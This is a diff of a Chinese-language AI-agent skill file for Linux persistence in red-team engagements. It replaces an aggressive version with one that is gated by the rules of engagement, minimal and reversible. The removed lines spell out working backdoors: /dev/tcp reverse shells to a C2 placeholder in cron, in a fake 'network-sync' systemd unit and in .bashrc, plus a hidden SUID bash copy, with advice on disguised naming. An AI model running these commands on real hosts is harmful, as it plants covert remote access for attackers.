@@ -1,365 +1,128 @@
 ---
 name: persistence-linux
-description: 在 Linux 目标上建立持久化后门，包括 cron 任务、systemd 服务、SSH authorized_keys、~/.bashrc 注入、SUID 后门等方式。当任务涉及 Linux 持久化、后门植入、维持访问、cron 后门时使用。执行前必须获得用户明确确认。
-enabled: true
-tags:
-  - persistence
-  - linux
+description: 在管理员显式启用、演练 ROE 允许且用户精确授权后，为 Linux Puppet 目标部署一项与红队任务匹配、可验证、限时且可完整回滚的持久化机制。当需要在既定存续窗口内维持对指定账号或主机的访问，并已提供载荷、路径和清理要求时使用。
 ---
 
-# Linux 持久化
+# Linux 红队持久化
 
-当用户明确要求在 Linux 目标上建立持久化访问时，使用这个 skill。
+此 skill 默认禁用。启用只表示能力可见，不代表本次演练授权。每次写入必须绑定精确目标、机制、载荷、存续窗口和回滚动作确认。
 
-**重要：执行前必须向用户明确说明将要进行的操作和影响，并等待确认。**
+## 行动目标
 
----
+- 在 ROE 允许的时间窗口内维持对指定主机或账号的访问。
+- 选择能满足目标的最小机制，不追求隐蔽性而增加复杂度。
+- 记录变更前值、本次唯一标识、验证结果、到期时间和清理责任。
+- 演练目标完成或窗口到期时可靠回滚。
 
-## 一、OPSEC 与环境约束
+## 必要输入
 
-| 原则 | 说明 |
-|---|---|
-| 用户确认优先 | 所有写操作执行前必须获得用户明确确认 |
-| 最小痕迹 | 只植入一种持久化方式，避免多重痕迹 |
-| 伪装命名 | 文件名、服务名、cron 注释要像系统组件 |
-| 记录清理路径 | 每次植入必须记录完整清理命令 |
-| 验证生效 | 植入后必须验证持久化已生效 |
+- 演练目标、授权主机、目标账号和当前权限。
+- 允许的机制：SSH 公钥、用户 crontab 或 systemd 服务。
+- 用户提供并批准的精确公钥或命令载荷。
+- 写入路径、服务名或唯一任务标识。
+- 生效时间、到期/清理时间和责任人。
+- 验证方法、变更前备份方式和完整回滚命令。
 
-**WebShell 环境注意：**
-- WebShell 用户（www-data/tomcat）可能没有 crontab 权限（`/etc/cron.allow` 限制）
-- `~/.ssh` 目录可能不存在且 HOME 目录可能不可写
-- 容器环境中 systemd 可能不可用（PID 1 不是 systemd）
-- 部分精简容器无 `cron` 守护进程
-- SELinux/AppArmor 可能阻止非标准路径执行
+任何一项缺失时停留在方案阶段，不自行生成 C2 地址、载荷或基础设施参数。
 
----
+## 授权与 ROE
 
-## 二、目标
+- 风险等级：high；访问模式：write-destructive。
+- 只部署一种机制，不建立冗余后门。
+- 不使用 SUID 副本、shell profile 注入、二进制替换、日志清理或伪装系统组件。
+- 不自动生成反弹 Shell、C2 载荷或隐藏命名。
+- 不覆盖既有 unit、任务或 authorized_keys 内容，不修改未批准的行。
+- 不保存私钥、密码、Token 或完整载荷到侦察摘要。
+- 用户只要求评估方案时，不执行任何写入。
 
-在目标机器上建立至少一种持久化机制，确保即使 Webshell 被清理或服务重启后，仍可恢复访问。
+## OPSEC 与变更预算
 
----
+- 最多一次配置写入、一次原生状态验证；失败时不叠加第二机制。
+- 优先选择现有服务能力和最小文件改动。
+- 写入前采集目标对象存在性、权限、哈希/内容摘要和相关安全策略。
+- 不关闭 SELinux、AppArmor、审计、安全产品或文件完整性监控。
+- 明确产生的文件、配置、服务、认证和网络痕迹。
 
-## 三、工作流程
+## 机制选择
 
-### 执行前：制定计划
+按任务需求选择，不按“最隐蔽”排序：
 
-在任何工具调用前，先输出：
+1. SSH authorized_keys：需要运维式交互访问、SSH 已启用、目标账号允许公钥登录。
+2. 用户 crontab：需要在明确时间窗口运行用户批准的非交互命令。
+3. systemd 服务：root 权限、需要开机/服务级存续、用户提供精确 ExecStart。
 
-1. **目标**：在目标 Linux 主机上建立持久化访问
-2. **路径**：确认权限和环境 → 选择合适方式 → 向用户确认 → 执行植入 → 验证生效 → 记录清理路径
-3. **终止条件**：至少一种持久化方式部署成功并验证，或所有方式均因权限不足失败时停止
+如果一次性访问已经足够完成目标，建议不部署持久化。
 
-如果已有侦察摘要，先读取 `privilegeProfile`（root 或普通用户）、`hostProfile`（OS 版本）、`containerProfile`（容器状态）。
+## 工作流
 
-### 第一步：环境确认
+1. 读取摘要和演练目标，确认持久化是否必要、目标是否在授权范围。
+2. 创建计划：环境与前值、机制/窗口/回滚、用户确认、写入与验证、到期交接。
+3. 用只读命令确认身份、HOME、SSH、cron、systemd、容器、挂载和安全策略。
+4. 选择一种机制，生成精确变更计划和回滚计划，不执行。
+5. 调用 `request_user_input`，列出每条写命令、目标、前值摘要、载荷标识、存续窗口、痕迹、验证和回滚命令；随后停止本轮。
+6. 用户确认后只执行批准参数；任何参数变化都重新确认。
+7. 写入后验证目标配置只包含本次批准变更。失败时执行已批准回滚并验证恢复。
+8. 摘要保存变更台账和到期责任，不保存秘密与完整载荷。
+
+## 只读环境确认
 
 ```bash
-id && whoami
-# 检查 cron 可用性
-which crontab 2>/dev/null && crontab -l 2>/dev/null
-# 检查 systemd 可用性
-ps -p 1 -o comm= 2>/dev/null
-# 检查 SSH 服务
-ss -tlnp 2>/dev/null | grep ":22"
-# 检查 HOME 目录可写性
-test -w ~ && echo "HOME_WRITABLE" || echo "HOME_NOT_WRITABLE"
+id; whoami; printf 'HOME=%s\n' "$HOME"; test -w "$HOME" && echo HOME_WRITABLE
+command -v crontab; crontab -l 2>/dev/null
+ps -p 1 -o comm= 2>/dev/null; command -v systemctl
+ss -tln 2>/dev/null | grep -E '(:22[[:space:]]|:22$)' || true
+grep -E '^(PubkeyAuthentication|AuthorizedKeysFile)' /etc/ssh/sshd_config 2>/dev/null
+test -f /.dockerenv && echo IN_DOCKER; findmnt -no TARGET,OPTIONS "$HOME" 2>/dev/null
+command -v getenforce >/dev/null && getenforce; command -v aa-status >/dev/null && aa-status 2>/dev/null | head -20
 ```
 
-### 第二步：选择持久化方式
+## 机制要求
 
-根据环境选择（向用户说明后等待确认）：
+### SSH authorized_keys
 
-| 权限 | 环境 | 推荐方式 | 备选 |
-|---|---|---|---|
-| root | systemd 可用 | systemd 服务 | cron |
-| root | 无 systemd | cron（root crontab） | SUID 后门 |
-| 普通用户 | SSH 开启 | SSH authorized_keys | cron |
-| 普通用户 | 无 SSH | cron | bashrc 注入 |
-| 容器内 | 任意 | cron（如可用） | bashrc |
+- 写入前计算用户提供公钥的指纹，检查是否已存在。
+- 保留原文件，按唯一注释或完整公钥精确追加和删除。
+- 验证目录/文件权限、sshd 生效配置和目标账号。
+- 不传输、读取或保存攻击者私钥。
 
-### 第三步：执行植入（用户确认后）
+### 用户 crontab
 
-### 第四步：验证生效
+- 使用绝对路径和本次唯一注释，保留所有原任务。
+- 明确运行用户、执行频率、开始/结束窗口、日志与网络行为。
+- 回滚只删除唯一标识对应任务；禁止脆弱的整表覆盖管道。
 
-### 第五步：记录清理路径并写入摘要
+### systemd 服务
 
----
+- 仅 root 且 PID 1/systemd 条件满足时使用。
+- 服务名必须用户批准、可归因于演练，不伪装系统组件。
+- unit 已存在时停止，不覆盖；明确 User、WorkingDirectory、ExecStart、Restart 和日志。
+- 回滚顺序：停止、禁用、删除本次 unit、daemon-reload，并核对原状态。
 
-## 四、持久化方式
+## 成功与停止条件
 
-### 方式一：cron 后门（低权限可用）
+成功：唯一机制已按批准参数部署，原生状态验证通过，变更前值、到期时间和回滚命令均已记录。
 
-**适用：** 任何有 crontab 权限的用户
+立即停止并报告/回滚：
 
-**植入：**
-```bash
-# 添加 cron（替换 C2 地址和端口）
-(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<C2_HOST>/<C2_PORT> 0>&1'") | crontab -
-```
+- 发现目标、账号、机制或载荷超出 ROE。
+- 目标配置与确认前发生变化，可能有并发修改。
+- 写入影响既有服务、账号或任务。
+- SELinux/AppArmor/只读挂载等阻止执行。
+- 验证失败、产生未批准网络连接或出现异常系统影响。
+- 演练目标已可在不持久化情况下完成。
 
-**验证：**
-```bash
-crontab -l | grep -v "^#"
-```
-
-**清理：**
-```bash
-crontab -l | grep -v "<C2_HOST>" | crontab -
-```
-
-**注意：**
-- 频率不要太高（建议 ≥5 分钟），避免日志刷屏
-- 如果 `/etc/cron.allow` 存在且不含当前用户，crontab 不可用
-- root 用户可直接写 `/etc/cron.d/` 下的文件（更隐蔽）
-
-### 方式二：SSH authorized_keys（推荐，最稳定）
-
-**适用：** 目标开启 SSH 服务，且可写 `~/.ssh/` 目录
-
-**植入：**
-```bash
-mkdir -p ~/.ssh && chmod 700 ~/.ssh
-echo "<ATTACKER_PUBLIC_KEY>" >> ~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-```
-
-**验证：**
-```bash
-cat ~/.ssh/authorized_keys | tail -1
-```
-
-**清理：**
-```bash
-# 删除最后一行（或指定公钥行）
-sed -i '/<KEY_FINGERPRINT>/d' ~/.ssh/authorized_keys
-```
-
-**注意：**
-- 需要事先在攻击者机器生成密钥对（`ssh-keygen -t ed25519`）
-- 如果 SSH 只监听内网，需通过代理访问
-- 检查 `/etc/ssh/sshd_config` 中 `AuthorizedKeysFile` 是否为默认路径
-- 检查是否禁用了密钥认证（`PubkeyAuthentication`）
-
-### 方式三：systemd 服务（需要 root）
-
-**适用：** 有 root 权限，目标使用 systemd
-
-**植入：**
-```bash
-cat > /etc/systemd/system/network-sync.service << 'EOF'
-[Unit]
-Description=Network Time Synchronization Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<C2_HOST>/<C2_PORT> 0>&1'
-Restart=always
-RestartSec=60
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-systemctl daemon-reload
-systemctl enable network-sync.service
-systemctl start network-sync.service
-```
-
-**验证：**
-```bash
-systemctl is-enabled network-sync.service
-systemctl status network-sync.service
-```
-
-**清理：**
-```bash
-systemctl disable --now network-sync.service
-rm /etc/systemd/system/network-sync.service
-systemctl daemon-reload
-```
-
-**注意：**
-- 服务名要像系统服务（`network-sync`、`system-monitor`）
-- `RestartSec` 控制重连间隔，不要太短
-- 容器内通常无 systemd，此方式不可用
-
-### 方式四：~/.bashrc / ~/.profile 注入（低权限，交互式触发）
-
-**适用：** 低权限用户，作为辅助手段
-
-**植入：**
-```bash
-echo 'nohup bash -i >& /dev/tcp/<C2_HOST>/<C2_PORT> 0>&1 2>/dev/null &' >> ~/.bashrc
-```
-
-**验证：**
-```bash
-tail -1 ~/.bashrc
-```
-
-**清理：**
-```bash
-sed -i '/<C2_HOST>/d' ~/.bashrc
-```
-
-**局限性：** 只在用户手动登录交互式 Shell 时触发，不适合持续驻留。
-
-### 方式五：SUID 后门（需要 root，隐蔽性高）
-
-**适用：** 有 root 权限，留下可随时提权的入口
-
-**植入：**
-```bash
-cp /bin/bash /usr/lib/.cache-update
-chmod u+s /usr/lib/.cache-update
-```
-
-**使用（普通用户执行）：**
-```bash
-/usr/lib/.cache-update -p
-```
-
-**验证：**
-```bash
-ls -la /usr/lib/.cache-update | grep "^-..s"
-```
-
-**清理：**
-```bash
-rm /usr/lib/.cache-update
-```
-
-**注意：**
-- 路径选择要隐蔽（`/usr/lib/`、`/var/cache/` 等系统目录）
-- 文件名要像系统文件（`.cache-update`、`.libsync`）
-- 部分系统挂载 `/tmp` 为 nosuid，不要放在 `/tmp`
-
----
-
-## 五、工具优先级
-
-| 优先级 | 工具 | 用途 |
-|---|---|---|
-| 1 | `CommandTools` | 环境确认、执行植入命令、验证 |
-| 2 | `FileTools` | 创建 systemd 服务文件、读取验证 |
-
----
-
-## 六、失败回退
-
-| 场景 | 回退策略 |
-|---|---|
-| crontab 被 `/etc/cron.allow` 限制 | 尝试 SSH 公钥或 bashrc |
-| `~/.ssh` 不可写 | 尝试 cron |
-| 容器内无 systemd | 使用 cron 或 bashrc |
-| 容器内无 cron | 使用 bashrc 或在应用启动脚本中注入 |
-| SELinux 阻止执行 | 标注限制，建议用户评估是否调整 |
-| SSH 未开启 | 使用 cron 或 systemd |
-| 所有方式均失败 | 报告环境限制，建议用户评估其他方案 |
-
----
-
-## 七、输出格式
+## 变更台账与交接
 
 ```markdown
-## Linux 持久化摘要
-
-**当前权限**：{username}（{root/user}）
-**选择方式**：{method_name}
-**状态**：{已部署并验证 / 部署失败}
-
----
-
-## 植入详情
-
-| 项目 | 内容 |
-|------|------|
-| 方式 | {cron / ssh_key / systemd / bashrc / suid} |
-| 位置 | {完整路径或 crontab 规则} |
-| 触发条件 | {定时 / 开机 / 登录时 / 手动} |
-| 连接方式 | {如何重新接入} |
-
-## 清理命令
-
-```bash
-{完整清理命令}
+## Linux 红队持久化变更
+- 目标、账号和演练目的：...
+- 机制、路径和唯一标识/公钥指纹：...
+- 变更前值摘要：...
+- 确认范围与执行时间：...
+- 生效/到期时间与清理责任：...
+- 验证结果和产生痕迹：...
+- 完整回滚命令与回滚状态：...
+- 未保存：秘密值和完整载荷
 ```
 
-## 验证结果
-
-{验证输出}
-
-## 下一步建议
-
-1~2 条具体建议
-```
-
-### 建议示例
-
-| 场景 | 建议 |
-|---|---|
-| 持久化成功 | 使用 recon-internal-network skill 探测内网 |
-| 需要凭据 | 使用 hunt-credentials skill 收集凭据 |
-| 权限不足 | 先使用 escalate-linux-privilege skill 提权 |
-
----
-
-## 八、决策规则
-
-| 场景 | 行为 |
-|---|---|
-| 执行前 | 必须向用户确认，说明写入内容和位置 |
-| 多种方式可用 | 推荐 SSH 公钥（最稳定、最隐蔽、最易清理） |
-| 无 root 权限 | 优先 cron 或 SSH 公钥 |
-| 需要最高隐蔽性 + root | SUID 后门（无网络连接痕迹） |
-| 命名规范 | 像系统组件，避免 `shell`、`backdoor` 等 |
-| 植入数量 | 只植入一种，避免多重痕迹 |
-| 植入后 | 必须验证生效并记录清理命令 |
-| 容器环境 | 注意容器重启后文件可能丢失 |
-| 所有植入信息 | 写入侦察摘要 |
-
----
-
-## 九、结构化摘要写入
-
-完成后必须：
-
-1. `manage_recon_summary(action="append")` — 已部署的持久化方式、路径和验证结果
-2. `manage_recon_summary(action="append")` — 机器可读字段
-
-结构化 patch 示例：
-
-```json
-{
-  "persistenceProfile": {
-    "linux": {
-      "methods": [
-        {
-          "type": "ssh_authorized_keys",
-          "deployed": true,
-          "path": "/home/www-data/.ssh/authorized_keys",
-          "payload": "ed25519 public key",
-          "trigger": "ssh login",
-          "verified": true,
-          "cleanup": "sed -i '/<fingerprint>/d' ~/.ssh/authorized_keys"
-        }
-      ],
-      "cleanupNotes": "删除 authorized_keys 中对应公钥行即可清除"
-    }
-  }
-}
-```
-
----
-
-## Skill 元数据
-
-- riskLevel: `high`
-- accessMode: `write_destructive`
-- requiredTools: `CommandTools`, `FileTools`
-- optionalTools: `ResourceTools`, `ScheduledTaskTools`, `ServiceManagerTools`, `PersistenceTools`
-- produces: `persistenceProfile.linux`, `openQuestions`
-- recommendedNextSkills: `recon-internal-network`, `hunt-credentials`
-- forbiddenByDefault: 未经用户确认不得执行任何写入操作
+最终输出必须明确：修改了什么、为何需要、何时清理、谁负责、如何验证和如何回滚。不得宣称删除系统安全日志是清理步骤。
